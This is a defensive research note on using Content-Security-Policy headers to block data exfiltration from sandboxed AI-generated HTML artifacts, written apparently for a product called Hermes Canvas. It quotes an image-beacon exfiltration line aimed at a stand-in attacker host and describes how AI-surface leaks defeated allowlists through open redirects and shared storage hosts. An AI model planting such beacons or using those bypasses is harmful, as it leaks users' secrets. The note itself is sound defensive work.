# CSP to block network egress / exfiltration from sandboxed artifacts

- Type: PRIMARY/AUTHORITATIVE (MDN, OWASP CSP Cheat Sheet, W3C CSP3, content-security-policy.com)
- Tag: csp
- Accessed: 2026-07-13
- URLs:
  - https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/sandbox
  - https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html
  - https://content-security-policy.com/
  - https://www.w3.org/TR/CSP3/

## Two distinct CSP tools

1. **CSP `sandbox` directive** (server-header equivalent of iframe sandbox attr):
   ```http
   Content-Security-Policy: sandbox allow-scripts;
   ```
   Gives the response an opaque/null origin + lets scripts run. Same token set as
   the iframe attribute (allow-forms, allow-popups, allow-top-navigation, ...).
   NOTE: `sandbox` is NOT allowed in `<meta>` and NOT in `-Report-Only`; must be a
   real response header. (MDN)

2. **Resource-fetch directives** to stop data exfil egress. OWASP/W3C:
   - `default-src 'none'` — blocks everything not explicitly re-allowed (scripts,
     XHR/fetch/WebSocket/EventSource, fonts, media, frames, images).
   - `connect-src` governs fetch/XHR/WebSocket/EventSource/`navigator.sendBeacon`.
     `connect-src 'none'` blocks all scripted network egress.
   - `img-src` governs `<img>` — the classic beacon exfil channel. Lock to an
     allowlist or `'none'`.

## Concrete lockdown header for agent HTML (no egress)

```http
Content-Security-Policy: sandbox allow-scripts;
  default-src 'none';
  script-src 'unsafe-inline' https://cdnjs.cloudflare.com;
  style-src 'unsafe-inline';
  img-src data:;
  connect-src 'none';
  form-action 'none';
  base-uri 'none'
```
- `connect-src 'none'` kills fetch/XHR/WebSocket/beacon exfil.
- `img-src data:` (or an allowlist) prevents `<img src=https://attacker/?=secret>`
  beacon exfiltration — the #1 real-world AI-surface leak vector (see incidents).
- To also allow specific CDNs for images/fonts, replace `'none'`/`data:` with an
  explicit host allowlist, never `*`.

## Caveat (important)

CSP `img-src`/`connect-src` allowlists can be BYPASSED if the allowlist contains
an open redirect or a shared bucket host (e.g. Azure `*.blob.core.windows.net`,
Teams proxy) — this is exactly how ChatGPT and EchoLeak exfils defeated allowlists.
Prefer `'none'` + no dynamic egress over a permissive allowlist.

## Relevance to Hermes Canvas

CSP is the second half of the boundary: separate-origin iframe stops session theft;
`connect-src 'none'` + tight `img-src` stops the artifact from phoning data home.
Both are static header/attribute config — no server VM needed (Fable #2 pro).
- Confidence: HIGH (MDN/OWASP/W3C primary).
